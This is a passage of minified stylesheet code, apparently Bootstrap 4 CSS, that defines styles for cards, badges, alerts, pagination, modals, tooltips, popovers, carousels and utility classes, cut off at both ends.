.card-header,.card-group>.card:not(:first-child) .card-img-top{border-top-left-radius:0}.card-group>.card:not(:first-child) .card-footer,.card-group>.card:not(:first-child) .card-img-bottom{border-bottom-left-radius:0}}.card-columns .card{margin-bottom:.75rem}@media (min-width:576px){.card-columns{-webkit-column-count:3;-moz-column-count:3;column-count:3;-webkit-column-gap:1.25rem;-moz-column-gap:1.25rem;column-gap:1.25rem;orphans:1;widows:1}.card-columns .card{display:inline-block;width:100%}}.accordion{overflow-anchor:none}.accordion>.card{overflow:hidden}.accordion>.card:not(:last-of-type){border-bottom:0;border-bottom-right-radius:0;border-bottom-left-radius:0}.accordion>.card:not(:first-of-type){border-top-left-radius:0;border-top-right-radius:0}.accordion>.card>.card-header{border-radius:0;margin-bottom:-1px}.breadcrumb{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap;padding:.75rem 1rem;margin-bottom:1rem;list-style:none;background-color:#e9ecef;border-radius:.25rem}.breadcrumb-item{display:-ms-flexbox;display:flex}.breadcrumb-item+.breadcrumb-item{padding-left:.5rem}.breadcrumb-item+.breadcrumb-item::before{display:inline-block;padding-right:.5rem;color:#6c757d;content:"/"}.breadcrumb-item+.breadcrumb-item:hover::before{text-decoration:underline}.breadcrumb-item+.breadcrumb-item:hover::before{text-decoration:none}.breadcrumb-item.active{color:#6c757d}.pagination{display:-ms-flexbox;display:flex;padding-left:0;list-style:none;border-radius:.25rem}.page-link{position:relative;display:block;padding:.5rem .75rem;margin-left:-1px;line-height:1.25;color:#007bff;background-color:#fff;border:1px solid #dee2e6}.page-link:hover{z-index:2;color:#0056b3;text-decoration:none;background-color:#e9ecef;border-color:#dee2e6}.page-link:focus{z-index:3;outline:0;box-shadow:0 0 0 .2rem rgba(0,123,255,.25)}.page-item:first-child .page-link{margin-left:0;border-top-left-radius:.25rem;border-bottom-left-radius:.25rem}.page-item:last-child .page-link{border-top-right-radius:.25rem;border-bottom-right-radius:.25rem}.page-item.active .page-link{z-index:3;color:#fff;background-color:#007bff;border-color:#007bff}.page-item.disabled .page-link{color:#6c757d;pointer-events:none;cursor:auto;background-color:#fff;border-color:#dee2e6}.pagination-lg .page-link{padding:.75rem 1.5rem;font-size:1.25rem;line-height:1.5}.pagination-lg .page-item:first-child .page-link{border-top-left-radius:.3rem;border-bottom-left-radius:.3rem}.pagination-lg .page-item:last-child .page-link{border-top-right-radius:.3rem;border-bottom-right-radius:.3rem}.pagination-sm .page-link{padding:.25rem .5rem;font-size:.875rem;line-height:1.5}.pagination-sm .page-item:first-child .page-link{border-top-left-radius:.2rem;border-bottom-left-radius:.2rem}.pagination-sm .page-item:last-child .page-link{border-top-right-radius:.2rem;border-bottom-right-radius:.2rem}.badge{display:inline-block;padding:.25em .4em;font-size:75%;font-weight:700;line-height:1;text-align:center;white-space:nowrap;vertical-align:baseline;border-radius:.25rem;transition:color .15s ease-in-out,background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out}@media (prefers-reduced-motion:reduce){.badge{transition:none}}a.badge:focus,a.badge:hover{text-decoration:none}.badge:empty{display:none}.btn .badge{position:relative;top:-1px}.badge-pill{padding-right:.6em;padding-left:.6em;border-radius:10rem}.badge-primary{color:#fff;background-color:#007bff}a.badge-primary:focus,a.badge-primary:hover{color:#fff;background-color:#0062cc}a.badge-primary.focus,a.badge-primary:focus{outline:0;box-shadow:0 0 0 .2rem rgba(0,123,255,.5)}.badge-secondary{color:#fff;background-color:#6c757d}a.badge-secondary:focus,a.badge-secondary:hover{color:#fff;background-color:#545b62}a.badge-secondary.focus,a.badge-secondary:focus{outline:0;box-shadow:0 0 0 .2rem rgba(108,117,125,.5)}.badge-success{color:#fff;background-color:#28a745}a.badge-success:focus,a.badge-success:hover{color:#fff;background-color:#1e7e34}a.badge-success.focus,a.badge-success:focus{outline:0;box-shadow:0 0 0 .2rem rgba(40,167,69,.5)}.badge-info{color:#fff;background-color:#17a2b8}a.badge-info:focus,a.badge-info:hover{color:#fff;background-color:#117a8b}a.badge-info.focus,a.badge-info:focus{outline:0;box-shadow:0 0 0 .2rem rgba(23,162,184,.5)}.badge-warning{color:#212529;background-color:#ffc107}a.badge-warning:focus,a.badge-warning:hover{color:#212529;background-color:#d39e00}a.badge-warning.focus,a.badge-warning:focus{outline:0;box-shadow:0 0 0 .2rem rgba(255,193,7,.5)}.badge-danger{color:#fff;background-color:#dc3545}a.badge-danger:focus,a.badge-danger:hover{color:#fff;background-color:#bd2130}a.badge-danger.focus,a.badge-danger:focus{outline:0;box-shadow:0 0 0 .2rem rgba(220,53,69,.5)}.badge-light{color:#212529;background-color:#f8f9fa}a.badge-light:focus,a.badge-light:hover{color:#212529;background-color:#dae0e5}a.badge-light.focus,a.badge-light:focus{outline:0;box-shadow:0 0 0 .2rem rgba(248,249,250,.5)}.badge-dark{color:#fff;background-color:#343a40}a.badge-dark:focus,a.badge-dark:hover{color:#fff;background-color:#1d2124}a.badge-dark.focus,a.badge-dark:focus{outline:0;box-shadow:0 0 0 .2rem rgba(52,58,64,.5)}.jumbotron{padding:2rem 1rem;margin-bottom:2rem;background-color:#e9ecef;border-radius:.3rem}@media (min-width:576px){.jumbotron{padding:4rem 2rem}}.jumbotron-fluid{padding-right:0;padding-left:0;border-radius:0}.alert{position:relative;padding:.75rem 1.25rem;margin-bottom:1rem;border:1px solid transparent;border-radius:.25rem}.alert-heading{color:inherit}.alert-link{font-weight:700}.alert-dismissible{padding-right:4rem}.alert-dismissible .close{position:absolute;top:0;right:0;z-index:2;padding:.75rem 1.25rem;color:inherit}.alert-primary{color:#004085;background-color:#cce5ff;border-color:#b8daff}.alert-primary hr{border-top-color:#9fcdff}.alert-primary .alert-link{color:#002752}.alert-secondary{color:#383d41;background-color:#e2e3e5;border-color:#d6d8db}.alert-secondary hr{border-top-color:#c8cbcf}.alert-secondary .alert-link{color:#202326}.alert-success{color:#155724;background-color:#d4edda;border-color:#c3e6cb}.alert-success hr{border-top-color:#b1dfbb}.alert-success .alert-link{color:#0b2e13}.alert-info{color:#0c5460;background-color:#d1ecf1;border-color:#bee5eb}.alert-info hr{border-top-color:#abdde5}.alert-info .alert-link{color:#062c33}.alert-warning{color:#856404;background-color:#fff3cd;border-color:#ffeeba}.alert-warning hr{border-top-color:#ffe8a1}.alert-warning .alert-link{color:#533f03}.alert-danger{color:#721c24;background-color:#f8d7da;border-color:#f5c6cb}.alert-danger hr{border-top-color:#f1b0b7}.alert-danger .alert-link{color:#491217}.alert-light{color:#818182;background-color:#fefefe;border-color:#fdfdfe}.alert-light hr{border-top-color:#ececf6}.alert-light .alert-link{color:#686868}.alert-dark{color:#1b1e21;background-color:#d6d8d9;border-color:#c6c8ca}.alert-dark hr{border-top-color:#b9bbbe}.alert-dark .alert-link{color:#040505}@-webkit-keyframes progress-bar-stripes{from{background-position:1rem 0}to{background-position:0 0}}@keyframes progress-bar-stripes{from{background-position:1rem 0}to{background-position:0 0}}.progress{display:-ms-flexbox;display:flex;height:1rem;overflow:hidden;line-height:0;font-size:.75rem;background-color:#e9ecef;border-radius:.25rem}.progress-bar{display:-ms-flexbox;display:flex;-ms-flex-direction:column;flex-direction:column;-ms-flex-pack:center;justify-content:center;overflow:hidden;color:#fff;text-align:center;white-space:nowrap;background-color:#007bff;transition:width .6s ease}@media (prefers-reduced-motion:reduce){.progress-bar{transition:none}}.progress-bar-striped{background-image:linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-size:1rem 1rem}.progress-bar-animated{-webkit-animation:progress-bar-stripes 1s linear infinite;animation:progress-bar-stripes 1s linear infinite}@media (prefers-reduced-motion:reduce){.progress-bar-animated{-webkit-animation:none;animation:none}}.media{display:-ms-flexbox;display:flex;-ms-flex-align:start;align-items:flex-start}.media-body{-ms-flex:1;flex:1}.list-group{display:-ms-flexbox;display:flex;-ms-flex-direction:column;flex-direction:column;padding-left:0;margin-bottom:0;border-radius:.25rem}.list-group-item-action{width:100%;color:#495057;text-align:inherit}.list-group-item-action:focus,.list-group-item-action:hover{z-index:1;color:#495057;text-decoration:none;background-color:#f8f9fa}.list-group-item-action:active{color:#212529;background-color:#e9ecef}.list-group-item{position:relative;display:block;padding:.75rem 1.25rem;background-color:#fff;border:1px solid rgba(0,0,0,.125)}.list-group-item:first-child{border-top-left-radius:inherit;border-top-right-radius:inherit}.list-group-item:last-child{border-bottom-right-radius:inherit;border-bottom-left-radius:inherit}.list-group-item.disabled,.list-group-item:disabled{color:#6c757d;pointer-events:none;background-color:#fff}.list-group-item.active{z-index:2;color:#fff;background-color:#007bff;border-color:#007bff}.list-group-item+.list-group-item{border-top-width:0}.list-group-item+.list-group-item.active{margin-top:-1px;border-top-width:1px}.list-group-horizontal{-ms-flex-direction:row;flex-direction:row}.list-group-horizontal>.list-group-item:first-child{border-bottom-left-radius:.25rem;border-top-right-radius:0}.list-group-horizontal>.list-group-item:last-child{border-top-right-radius:.25rem;border-bottom-left-radius:0}.list-group-horizontal>.list-group-item.active{margin-top:0}.list-group-horizontal>.list-group-item+.list-group-item{border-top-width:1px;border-left-width:0}.list-group-horizontal>.list-group-item+.list-group-item.active{margin-left:-1px;border-left-width:1px}@media (min-width:576px){.list-group-horizontal-sm{-ms-flex-direction:row;flex-direction:row}.list-group-horizontal-sm>.list-group-item:first-child{border-bottom-left-radius:.25rem;border-top-right-radius:0}.list-group-horizontal-sm>.list-group-item:last-child{border-top-right-radius:.25rem;border-bottom-left-radius:0}.list-group-horizontal-sm>.list-group-item.active{margin-top:0}.list-group-horizontal-sm>.list-group-item+.list-group-item{border-top-width:1px;border-left-width:0}.list-group-horizontal-sm>.list-group-item+.list-group-item.active{margin-left:-1px;border-left-width:1px}}@media (min-width:768px){.list-group-horizontal-md{-ms-flex-direction:row;flex-direction:row}.list-group-horizontal-md>.list-group-item:first-child{border-bottom-left-radius:.25rem;border-top-right-radius:0}.list-group-horizontal-md>.list-group-item:last-child{border-top-right-radius:.25rem;border-bottom-left-radius:0}.list-group-horizontal-md>.list-group-item.active{margin-top:0}.list-group-horizontal-md>.list-group-item+.list-group-item{border-top-width:1px;border-left-width:0}.list-group-horizontal-md>.list-group-item+.list-group-item.active{margin-left:-1px;border-left-width:1px}}@media (min-width:992px){.list-group-horizontal-lg{-ms-flex-direction:row;flex-direction:row}.list-group-horizontal-lg>.list-group-item:first-child{border-bottom-left-radius:.25rem;border-top-right-radius:0}.list-group-horizontal-lg>.list-group-item:last-child{border-top-right-radius:.25rem;border-bottom-left-radius:0}.list-group-horizontal-lg>.list-group-item.active{margin-top:0}.list-group-horizontal-lg>.list-group-item+.list-group-item{border-top-width:1px;border-left-width:0}.list-group-horizontal-lg>.list-group-item+.list-group-item.active{margin-left:-1px;border-left-width:1px}}@media (min-width:1200px){.list-group-horizontal-xl{-ms-flex-direction:row;flex-direction:row}.list-group-horizontal-xl>.list-group-item:first-child{border-bottom-left-radius:.25rem;border-top-right-radius:0}.list-group-horizontal-xl>.list-group-item:last-child{border-top-right-radius:.25rem;border-bottom-left-radius:0}.list-group-horizontal-xl>.list-group-item.active{margin-top:0}.list-group-horizontal-xl>.list-group-item+.list-group-item{border-top-width:1px;border-left-width:0}.list-group-horizontal-xl>.list-group-item+.list-group-item.active{margin-left:-1px;border-left-width:1px}}.list-group-flush{border-radius:0}.list-group-flush>.list-group-item{border-width:0 0 1px}.list-group-flush>.list-group-item:last-child{border-bottom-width:0}.list-group-item-primary{color:#004085;background-color:#b8daff}.list-group-item-primary.list-group-item-action:focus,.list-group-item-primary.list-group-item-action:hover{color:#004085;background-color:#9fcdff}.list-group-item-primary.list-group-item-action.active{color:#fff;background-color:#004085;border-color:#004085}.list-group-item-secondary{color:#383d41;background-color:#d6d8db}.list-group-item-secondary.list-group-item-action:focus,.list-group-item-secondary.list-group-item-action:hover{color:#383d41;background-color:#c8cbcf}.list-group-item-secondary.list-group-item-action.active{color:#fff;background-color:#383d41;border-color:#383d41}.list-group-item-success{color:#155724;background-color:#c3e6cb}.list-group-item-success.list-group-item-action:focus,.list-group-item-success.list-group-item-action:hover{color:#155724;background-color:#b1dfbb}.list-group-item-success.list-group-item-action.active{color:#fff;background-color:#155724;border-color:#155724}.list-group-item-info{color:#0c5460;background-color:#bee5eb}.list-group-item-info.list-group-item-action:focus,.list-group-item-info.list-group-item-action:hover{color:#0c5460;background-color:#abdde5}.list-group-item-info.list-group-item-action.active{color:#fff;background-color:#0c5460;border-color:#0c5460}.list-group-item-warning{color:#856404;background-color:#ffeeba}.list-group-item-warning.list-group-item-action:focus,.list-group-item-warning.list-group-item-action:hover{color:#856404;background-color:#ffe8a1}.list-group-item-warning.list-group-item-action.active{color:#fff;background-color:#856404;border-color:#856404}.list-group-item-danger{color:#721c24;background-color:#f5c6cb}.list-group-item-danger.list-group-item-action:focus,.list-group-item-danger.list-group-item-action:hover{color:#721c24;background-color:#f1b0b7}.list-group-item-danger.list-group-item-action.active{color:#fff;background-color:#721c24;border-color:#721c24}.list-group-item-light{color:#818182;background-color:#fdfdfe}.list-group-item-light.list-group-item-action:focus,.list-group-item-light.list-group-item-action:hover{color:#818182;background-color:#ececf6}.list-group-item-light.list-group-item-action.active{color:#fff;background-color:#818182;border-color:#818182}.list-group-item-dark{color:#1b1e21;background-color:#c6c8ca}.list-group-item-dark.list-group-item-action:focus,.list-group-item-dark.list-group-item-action:hover{color:#1b1e21;background-color:#b9bbbe}.list-group-item-dark.list-group-item-action.active{color:#fff;background-color:#1b1e21;border-color:#1b1e21}.close{float:right;font-size:1.5rem;font-weight:700;line-height:1;color:#000;text-shadow:0 1px 0 #fff;opacity:.5}.close:hover{color:#000;text-decoration:none}.close:not(:disabled):not(.disabled):focus,.close:not(:disabled):not(.disabled):hover{opacity:.75}button.close{padding:0;background-color:transparent;border:0}a.close.disabled{pointer-events:none}.toast{-ms-flex-preferred-size:350px;flex-basis:350px;max-width:350px;font-size:.875rem;background-color:rgba(255,255,255,.85);background-clip:padding-box;border:1px solid rgba(0,0,0,.1);box-shadow:0 .25rem .75rem rgba(0,0,0,.1);opacity:0;border-radius:.25rem}.toast:not(:last-child){margin-bottom:.75rem}.toast.showing{opacity:1}.toast.show{display:block;opacity:1}.toast.hide{display:none}.toast-header{display:-ms-flexbox;display:flex;-ms-flex-align:center;align-items:center;padding:.25rem .75rem;color:#6c757d;background-color:rgba(255,255,255,.85);background-clip:padding-box;border-bottom:1px solid rgba(0,0,0,.05);border-top-left-radius:calc(.25rem - 1px);border-top-right-radius:calc(.25rem - 1px)}.toast-body{padding:.75rem}.modal-open{overflow:hidden}.modal-open .modal{overflow-x:hidden;overflow-y:auto}.modal{position:fixed;top:0;left:0;z-index:1050;display:none;width:100%;height:100%;overflow:hidden;outline:0}.modal-dialog{position:relative;width:auto;margin:.5rem;pointer-events:none}.modal.fade .modal-dialog{transition:-webkit-transform .3s ease-out;transition:transform .3s ease-out;transition:transform .3s ease-out,-webkit-transform .3s ease-out;-webkit-transform:translate(0,-50px);transform:translate(0,-50px)}@media (prefers-reduced-motion:reduce){.modal.fade .modal-dialog{transition:none}}.modal.show .modal-dialog{-webkit-transform:none;transform:none}.modal.modal-static .modal-dialog{-webkit-transform:scale(1.02);transform:scale(1.02)}.modal-dialog-scrollable{display:-ms-flexbox;display:flex;max-height:calc(100% - 1rem)}.modal-dialog-scrollable .modal-content{max-height:calc(100vh - 1rem);overflow:hidden}.modal-dialog-scrollable .modal-footer,.modal-dialog-scrollable .modal-header{-ms-flex-negative:0;flex-shrink:0}.modal-dialog-scrollable .modal-body{overflow-y:auto}.modal-dialog-centered{display:-ms-flexbox;display:flex;-ms-flex-align:center;align-items:center;min-height:calc(100% - 1rem)}.modal-dialog-centered::before{display:block;height:calc(100vh - 1rem);height:-webkit-min-content;height:-moz-min-content;height:min-content;content:""}.modal-dialog-centered.modal-dialog-scrollable{-ms-flex-direction:column;flex-direction:column;-ms-flex-pack:center;justify-content:center;height:100%}.modal-dialog-centered.modal-dialog-scrollable .modal-content{max-height:none}.modal-dialog-centered.modal-dialog-scrollable::before{content:none}.modal-content{position:relative;display:-ms-flexbox;display:flex;-ms-flex-direction:column;flex-direction:column;width:100%;pointer-events:auto;background-color:#fff;background-clip:padding-box;border:1px solid rgba(0,0,0,.2);border-radius:.3rem;outline:0}.modal-backdrop{position:fixed;top:0;left:0;z-index:1040;width:100vw;height:100vh;background-color:#000}.modal-backdrop.fade{opacity:0}.modal-backdrop.show{opacity:.5}.modal-header{display:-ms-flexbox;display:flex;-ms-flex-align:start;align-items:flex-start;-ms-flex-pack:justify;justify-content:space-between;padding:1rem 1rem;border-bottom:1px solid #dee2e6;border-top-left-radius:calc(.3rem - 1px);border-top-right-radius:calc(.3rem - 1px)}.modal-header .close{padding:1rem 1rem;margin:-1rem -1rem -1rem auto}.modal-title{margin-bottom:0;line-height:1.5}.modal-body{position:relative;-ms-flex:1 1 auto;flex:1 1 auto;padding:1rem}.modal-footer{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap;-ms-flex-align:center;align-items:center;-ms-flex-pack:end;justify-content:flex-end;padding:.75rem;border-top:1px solid #dee2e6;border-bottom-right-radius:calc(.3rem - 1px);border-bottom-left-radius:calc(.3rem - 1px)}.modal-footer>*{margin:.25rem}.modal-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}@media (min-width:576px){.modal-dialog{max-width:500px;margin:1.75rem auto}.modal-dialog-scrollable{max-height:calc(100% - 3.5rem)}.modal-dialog-scrollable .modal-content{max-height:calc(100vh - 3.5rem)}.modal-dialog-centered{min-height:calc(100% - 3.5rem)}.modal-dialog-centered::before{height:calc(100vh - 3.5rem);height:-webkit-min-content;height:-moz-min-content;height:min-content}.modal-sm{max-width:300px}}@media (min-width:992px){.modal-lg,.modal-xl{max-width:800px}}@media (min-width:1200px){.modal-xl{max-width:1140px}}.tooltip{position:absolute;z-index:1070;display:block;margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";font-style:normal;font-weight:400;line-height:1.5;text-align:left;text-align:start;text-decoration:none;text-shadow:none;text-transform:none;letter-spacing:normal;word-break:normal;word-spacing:normal;white-space:normal;line-break:auto;font-size:.875rem;word-wrap:break-word;opacity:0}.tooltip.show{opacity:.9}.tooltip .arrow{position:absolute;display:block;width:.8rem;height:.4rem}.tooltip .arrow::before{position:absolute;content:"";border-color:transparent;border-style:solid}.bs-tooltip-auto[x-placement^=top],.bs-tooltip-top{padding:.4rem 0}.bs-tooltip-auto[x-placement^=top] .arrow,.bs-tooltip-top .arrow{bottom:0}.bs-tooltip-auto[x-placement^=top] .arrow::before,.bs-tooltip-top .arrow::before{top:0;border-width:.4rem .4rem 0;border-top-color:#000}.bs-tooltip-auto[x-placement^=right],.bs-tooltip-right{padding:0 .4rem}.bs-tooltip-auto[x-placement^=right] .arrow,.bs-tooltip-right .arrow{left:0;width:.4rem;height:.8rem}.bs-tooltip-auto[x-placement^=right] .arrow::before,.bs-tooltip-right .arrow::before{right:0;border-width:.4rem .4rem .4rem 0;border-right-color:#000}.bs-tooltip-auto[x-placement^=bottom],.bs-tooltip-bottom{padding:.4rem 0}.bs-tooltip-auto[x-placement^=bottom] .arrow,.bs-tooltip-bottom .arrow{top:0}.bs-tooltip-auto[x-placement^=bottom] .arrow::before,.bs-tooltip-bottom .arrow::before{bottom:0;border-width:0 .4rem .4rem;border-bottom-color:#000}.bs-tooltip-auto[x-placement^=left],.bs-tooltip-left{padding:0 .4rem}.bs-tooltip-auto[x-placement^=left] .arrow,.bs-tooltip-left .arrow{right:0;width:.4rem;height:.8rem}.bs-tooltip-auto[x-placement^=left] .arrow::before,.bs-tooltip-left .arrow::before{left:0;border-width:.4rem 0 .4rem .4rem;border-left-color:#000}.tooltip-inner{max-width:200px;padding:.25rem .5rem;color:#fff;text-align:center;background-color:#000;border-radius:.25rem}.popover{position:absolute;top:0;left:0;z-index:1060;display:block;max-width:276px;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";font-style:normal;font-weight:400;line-height:1.5;text-align:left;text-align:start;text-decoration:none;text-shadow:none;text-transform:none;letter-spacing:normal;word-break:normal;word-spacing:normal;white-space:normal;line-break:auto;font-size:.875rem;word-wrap:break-word;background-color:#fff;background-clip:padding-box;border:1px solid rgba(0,0,0,.2);border-radius:.3rem}.popover .arrow{position:absolute;display:block;width:1rem;height:.5rem;margin:0 .3rem}.popover .arrow::after,.popover .arrow::before{position:absolute;display:block;content:"";border-color:transparent;border-style:solid}.bs-popover-auto[x-placement^=top],.bs-popover-top{margin-bottom:.5rem}.bs-popover-auto[x-placement^=top]>.arrow,.bs-popover-top>.arrow{bottom:calc(-.5rem - 1px)}.bs-popover-auto[x-placement^=top]>.arrow::before,.bs-popover-top>.arrow::before{bottom:0;border-width:.5rem .5rem 0;border-top-color:rgba(0,0,0,.25)}.bs-popover-auto[x-placement^=top]>.arrow::after,.bs-popover-top>.arrow::after{bottom:1px;border-width:.5rem .5rem 0;border-top-color:#fff}.bs-popover-auto[x-placement^=right],.bs-popover-right{margin-left:.5rem}.bs-popover-auto[x-placement^=right]>.arrow,.bs-popover-right>.arrow{left:calc(-.5rem - 1px);width:.5rem;height:1rem;margin:.3rem 0}.bs-popover-auto[x-placement^=right]>.arrow::before,.bs-popover-right>.arrow::before{left:0;border-width:.5rem .5rem .5rem 0;border-right-color:rgba(0,0,0,.25)}.bs-popover-auto[x-placement^=right]>.arrow::after,.bs-popover-right>.arrow::after{left:1px;border-width:.5rem .5rem .5rem 0;border-right-color:#fff}.bs-popover-auto[x-placement^=bottom],.bs-popover-bottom{margin-top:.5rem}.bs-popover-auto[x-placement^=bottom]>.arrow,.bs-popover-bottom>.arrow{top:calc(-.5rem - 1px)}.bs-popover-auto[x-placement^=bottom]>.arrow::before,.bs-popover-bottom>.arrow::before{top:0;border-width:0 .5rem .5rem .5rem;border-bottom-color:rgba(0,0,0,.25)}.bs-popover-auto[x-placement^=bottom]>.arrow::after,.bs-popover-bottom>.arrow::after{top:1px;border-width:0 .5rem .5rem .5rem;border-bottom-color:#fff}.bs-popover-auto[x-placement^=bottom] .popover-header::before,.bs-popover-bottom .popover-header::before{position:absolute;top:0;left:50%;display:block;width:1rem;margin-left:-.5rem;content:"";border-bottom:1px solid #f7f7f7}.bs-popover-auto[x-placement^=left],.bs-popover-left{margin-right:.5rem}.bs-popover-auto[x-placement^=left]>.arrow,.bs-popover-left>.arrow{right:calc(-.5rem - 1px);width:.5rem;height:1rem;margin:.3rem 0}.bs-popover-auto[x-placement^=left]>.arrow::before,.bs-popover-left>.arrow::before{right:0;border-width:.5rem 0 .5rem .5rem;border-left-color:rgba(0,0,0,.25)}.bs-popover-auto[x-placement^=left]>.arrow::after,.bs-popover-left>.arrow::after{right:1px;border-width:.5rem 0 .5rem .5rem;border-left-color:#fff}.popover-header{padding:.5rem .75rem;margin-bottom:0;font-size:1rem;background-color:#f7f7f7;border-bottom:1px solid #ebebeb;border-top-left-radius:calc(.3rem - 1px);border-top-right-radius:calc(.3rem - 1px)}.popover-header:empty{display:none}.popover-body{padding:.5rem .75rem;color:#212529}.carousel{position:relative}.carousel.pointer-event{-ms-touch-action:pan-y;touch-action:pan-y}.carousel-inner{position:relative;width:100%;overflow:hidden}.carousel-inner::after{display:block;clear:both;content:""}.carousel-item{position:relative;display:none;float:left;width:100%;margin-right:-100%;-webkit-backface-visibility:hidden;backface-visibility:hidden;transition:-webkit-transform .6s ease-in-out;transition:transform .6s ease-in-out;transition:transform .6s ease-in-out,-webkit-transform .6s ease-in-out}@media (prefers-reduced-motion:reduce){.carousel-item{transition:none}}.carousel-item-next,.carousel-item-prev,.carousel-item.active{display:block}.active.carousel-item-right,.carousel-item-next:not(.carousel-item-left){-webkit-transform:translateX(100%);transform:translateX(100%)}.active.carousel-item-left,.carousel-item-prev:not(.carousel-item-right){-webkit-transform:translateX(-100%);transform:translateX(-100%)}.carousel-fade .carousel-item{opacity:0;transition-property:opacity;-webkit-transform:none;transform:none}.carousel-fade .carousel-item-next.carousel-item-left,.carousel-fade .carousel-item-prev.carousel-item-right,.carousel-fade .carousel-item.active{z-index:1;opacity:1}.carousel-fade .active.carousel-item-left,.carousel-fade .active.carousel-item-right{z-index:0;opacity:0;transition:opacity 0s .6s}@media (prefers-reduced-motion:reduce){.carousel-fade .active.carousel-item-left,.carousel-fade .active.carousel-item-right{transition:none}}.carousel-control-next,.carousel-control-prev{position:absolute;top:0;bottom:0;z-index:1;display:-ms-flexbox;display:flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;width:15%;color:#fff;text-align:center;opacity:.5;transition:opacity .15s ease}@media (prefers-reduced-motion:reduce){.carousel-control-next,.carousel-control-prev{transition:none}}.carousel-control-next:focus,.carousel-control-next:hover,.carousel-control-prev:focus,.carousel-control-prev:hover{color:#fff;text-decoration:none;outline:0;opacity:.9}.carousel-control-prev{left:0}.carousel-control-next{right:0}.carousel-control-next-icon,.carousel-control-prev-icon{display:inline-block;width:20px;height:20px;background:no-repeat 50%/100% 100%}.carousel-control-prev-icon{background-image:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='%23fff' width='8' height='8' viewBox='0 0 8 8'%3e%3cpath d='M5.25 0l-4 4 4 4 1.5-1.5L4.25 4l2.5-2.5L5.25 0z'/%3e%3c/svg%3e")}.carousel-control-next-icon{background-image:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='%23fff' width='8' height='8' viewBox='0 0 8 8'%3e%3cpath d='M2.75 0l-1.5 1.5L3.75 4l-2.5 2.5L2.75 8l4-4-4-4z'/%3e%3c/svg%3e")}.carousel-indicators{position:absolute;right:0;bottom:0;left:0;z-index:15;display:-ms-flexbox;display:flex;-ms-flex-pack:center;justify-content:center;padding-left:0;margin-right:15%;margin-left:15%;list-style:none}.carousel-indicators li{box-sizing:content-box;-ms-flex:0 1 auto;flex:0 1 auto;width:30px;height:3px;margin-right:3px;margin-left:3px;text-indent:-999px;cursor:pointer;background-color:#fff;background-clip:padding-box;border-top:10px solid transparent;border-bottom:10px solid transparent;opacity:.5;transition:opacity .6s ease}@media (prefers-reduced-motion:reduce){.carousel-indicators li{transition:none}}.carousel-indicators .active{opacity:1}.carousel-caption{position:absolute;right:15%;bottom:20px;left:15%;z-index:10;padding-top:20px;padding-bottom:20px;color:#fff;text-align:center}@-webkit-keyframes spinner-border{to{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes spinner-border{to{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}.spinner-border{display:inline-block;width:2rem;height:2rem;vertical-align:text-bottom;border:.25em solid currentColor;border-right-color:transparent;border-radius:50%;-webkit-animation:spinner-border .75s linear infinite;animation:spinner-border .75s linear infinite}.spinner-border-sm{width:1rem;height:1rem;border-width:.2em}@-webkit-keyframes spinner-grow{0%{-webkit-transform:scale(0);transform:scale(0)}50%{opacity:1;-webkit-transform:none;transform:none}}@keyframes spinner-grow{0%{-webkit-transform:scale(0);transform:scale(0)}50%{opacity:1;-webkit-transform:none;transform:none}}.spinner-grow{display:inline-block;width:2rem;height:2rem;vertical-align:text-bottom;background-color:currentColor;border-radius:50%;opacity:0;-webkit-animation:spinner-grow .75s linear infinite;animation:spinner-grow .75s linear infinite}.spinner-grow-sm{width:1rem;height:1rem}.align-baseline{vertical-align:baseline!important}.align-top{vertical-align:top!important}.align-middle{vertical-align:middle!important}.align-bottom{vertical-align:bottom!important}.align-text-bottom{vertical-align:text-bottom!important}.align-text-top{vertical-align:text-top!important}.bg-primary{background-color:#007bff!important}a.bg-primary:focus,a.bg-primary:hover,button.bg-primary:focus,button.bg-primary:hover{background-color:#0062cc!important}.bg-secondary{background-color:#6c757d!important}a.bg-secondary:focus,a.bg-secondary:hover,button.bg-secondary:focus,button.bg-secondary:hover{background-color:#545b62!important}.bg-success{background-color:#28a745!important}a.bg-success:focus,a.bg-success:hover,button.bg-success:focus,button.bg-success:hover{background-color:#1e7e34!important}.bg-info{background-color:#17a2b8!important}a.bg-info:focus,a.bg-info:hover,button.bg-info:focus,button.bg-info:hover{background-color:#117a8b!important}.bg-warning{background-color:#ffc107!important}a.bg-warning:focus,a.bg-warning:hover,button.bg-warning:focus,button.bg-warning:hover{background-color:#d39e00!important}.bg-danger{background-color:#dc3545!important}a.bg-danger:focus,a.bg-danger:hover,button.bg-danger:focus,button.bg-danger:hover{background-color:#bd2130!important}.bg-light{background-color:#f8f9fa!important}a.bg-light:focus,a.bg-light:hover,button.bg-light:focus,button.bg-light:hover{background-color:#dae0e5!important}.bg-dark{background-color:#343a40!important}a.bg-dark:focus,a.bg-dark:hover,button.bg-dark:focus,button.bg-dark:hover{background-color:#1d2124!important}.bg-white{background-color:#fff!important}.bg-transparent{background-color:transparent!important}.border{border:1px solid #dee2e6!important}.border-top{border-top:1px solid #dee2e6!important}.border-right{border-right:1px solid #dee2e6!important}.border-bottom{border-bottom:1px solid #dee2e6!important}.border-left{border-left:1px solid 